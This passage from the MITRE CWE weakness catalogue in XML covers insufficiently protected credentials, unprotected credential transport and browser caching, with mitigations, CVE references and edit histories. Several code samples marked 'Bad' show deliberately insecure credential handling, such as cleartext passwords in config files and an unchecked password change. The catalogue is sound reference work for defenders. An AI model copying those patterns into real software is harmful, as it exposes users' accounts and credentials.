            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Consider implementing a password complexity meter to inform users when a chosen password meets the required attributes.</Description>
            </Mitigation>
         </Potential_Mitigations>
	 <Observed_Examples>
	   <Observed_Example>
	     <Reference>CVE-2020-4574</Reference>
	     <Description>key server application does not require strong passwords</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2020-4574</Link>
	   </Observed_Example>
	 </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="112"/>
            <Related_Attack_Pattern CAPEC_ID="16"/>
            <Related_Attack_Pattern CAPEC_ID="49"/>
            <Related_Attack_Pattern CAPEC_ID="509"/>
            <Related_Attack_Pattern CAPEC_ID="55"/>
            <Related_Attack_Pattern CAPEC_ID="555"/>
            <Related_Attack_Pattern CAPEC_ID="561"/>
            <Related_Attack_Pattern CAPEC_ID="565"/>
            <Related_Attack_Pattern CAPEC_ID="70"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
            <Reference External_Reference_ID="REF-1053" Section="Sections: 5.1.1, 10.2.1, and Appendix A"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
			<Modification>
				<Modification_Name>CWE Content Team</Modification_Name>
				<Modification_Organization>MITRE</Modification_Organization>
				<Modification_Date>2019-06-20</Modification_Date>
				<Modification_Comment>updated Relationships</Modification_Comment>
			</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Modes_of_Introduction, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="522" Name="Insufficiently Protected Credentials" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain access to user accounts and access sensitive data used by the user accounts.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an appropriate security mechanism to protect the credentials.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make appropriate use of cryptography to protect the credentials.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use industry standards to protect the credentials (e.g. LDAP, keystore, etc.).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-56">
               <Intro_Text>This code changes a user's password.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$user = $_GET['user'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:1em;">SetUserPassword($user, $pass);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-57">
               <Intro_Text>The following code reads a password from a properties file and uses the password to connect to a database.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>Properties prop = new Properties();<xhtml:br/>prop.load(new FileInputStream("config.properties"));<xhtml:br/>String password = prop.getProperty("password");<xhtml:br/>DriverManager.getConnection(url, usr, password);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-58">
               <Intro_Text>The following code reads a password from the registry and uses the password to create a new network credential.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String password = regKey.GetValue(passKey).toString();<xhtml:br/>NetworkCredential netCred = new NetworkCredential(username,password,domain);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-59">
               <Intro_Text>Both of these examples verify a password by comparing it to a stored compressed version.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">if (strcmp(compress(password), compressed_password)) {<xhtml:div style="margin-left:1em;">printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (passwd.Equals(compress(password), compressed_password)) {<xhtml:div style="margin-left:1em;">return(0);</xhtml:div>}<xhtml:br/>
                        <xhtml:i>//Diagnostic Mode</xhtml:i>
                        <xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
               <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
               <Body_Text>Multiple vendors used cleartext transmission or storage of passwords in their OT products.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29959</Reference>
               <Description>Initialization file contains  credentials that can be decoded using a "simple string transformation"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29959</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-35411</Reference>
               <Description>Python-based RPC framework enables pickle functionality by default, allowing clients to unpickle untrusted data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-35411</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29519</Reference>
               <Description>Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29519</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30312</Reference>
               <Description>Building Controller uses a protocol that transmits authentication credentials in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30312</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-31204</Reference>
               <Description>Programmable Logic Controller (PLC) sends password in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31204</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30275</Reference>
               <Description>Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30275</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0681</Reference>
               <Description>Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-0681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0944</Reference>
               <Description>Web application password change utility doesn't check the original password.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0944</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
            <Related_Attack_Pattern CAPEC_ID="474"/>
            <Related_Attack_Pattern CAPEC_ID="50"/>
            <Related_Attack_Pattern CAPEC_ID="509"/>
            <Related_Attack_Pattern CAPEC_ID="551"/>
            <Related_Attack_Pattern CAPEC_ID="555"/>
            <Related_Attack_Pattern CAPEC_ID="560"/>
            <Related_Attack_Pattern CAPEC_ID="561"/>
            <Related_Attack_Pattern CAPEC_ID="600"/>
            <Related_Attack_Pattern CAPEC_ID="644"/>
            <Related_Attack_Pattern CAPEC_ID="645"/>
            <Related_Attack_Pattern CAPEC_ID="652"/>
            <Related_Attack_Pattern CAPEC_ID="653"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="523" Name="Unprotected Transport of Credentials" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>Login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="312" View_ID="1000"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="525" Name="Use of Web Browser Cache Containing Sensitive Information" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The web application does not use an appropriate caching policy that specifies the extent to which each web page and associated form fields should be cached.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="524" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Browsers often store information in a client-side cache, which can leave behind sensitive information for other users to find and exploit, such as passwords or credit card numbers. The locations at most risk include public terminals, such as those in libraries and Internet cafes.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Protect information stored in cache.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Use a restrictive caching policy for forms and web pages that potentially contain sensitive information.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not store unnecessarily sensitive information in the cache.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider using encryption in the cache.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="37"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
